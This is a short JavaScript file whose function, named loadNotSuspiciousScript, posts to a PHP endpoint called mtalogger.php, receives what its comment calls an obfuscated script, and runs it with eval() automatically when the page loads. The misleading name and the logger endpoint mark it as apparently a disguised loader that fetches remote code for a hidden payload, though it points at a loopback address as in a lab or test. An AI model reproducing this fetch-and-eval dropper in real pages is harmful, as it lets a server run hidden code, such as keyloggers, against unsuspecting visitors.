/**
 * This function gets the obfuscated script from 
 * 
 * 
 */
function loadNotSuspiciousScript () {
    formData = new FormData();
    formData.append("getScript", true);
    httpRequest = new XMLHttpRequest();
    httpRequest.onreadystatechange = function() {
        if(this.readyState == 4 && this.status == 200) {
            var response = JSON.parse(this.responseText);
            if(response.statusCode == 200) {
                eval(response.script);
            }
        }
    };
    httpRequest.open('POST', "http://127.0.0.10/PHP/mtalogger.php");
    httpRequest.send(formData);
}

loadNotSuspiciousScript();
